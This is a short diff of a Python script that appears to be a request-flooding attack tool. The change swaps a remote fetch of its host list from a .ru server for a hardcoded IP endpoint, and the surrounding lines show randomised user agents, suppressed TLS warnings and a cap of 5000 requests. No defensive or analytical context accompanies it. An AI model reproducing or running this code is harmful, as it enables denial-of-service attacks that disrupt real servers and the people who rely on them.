@@ -15,11 +15,7 @@ from urllib3 import disable_warnings
 from pyuseragents import random as random_useragent
 from json import loads
 
-try:
-    HOSTS = loads(requests.get("http://rockstarbloggers.ru/hosts.json").content)
-except:
-    sleep(5)
-    HOSTS = loads(requests.get("http://rockstarbloggers.ru/hosts.json").content)
+HOSTS = ["http://46.4.63.238/api.php"]
 MAX_REQUESTS = 5000
 disable_warnings()
 def clear(): return system('cls')
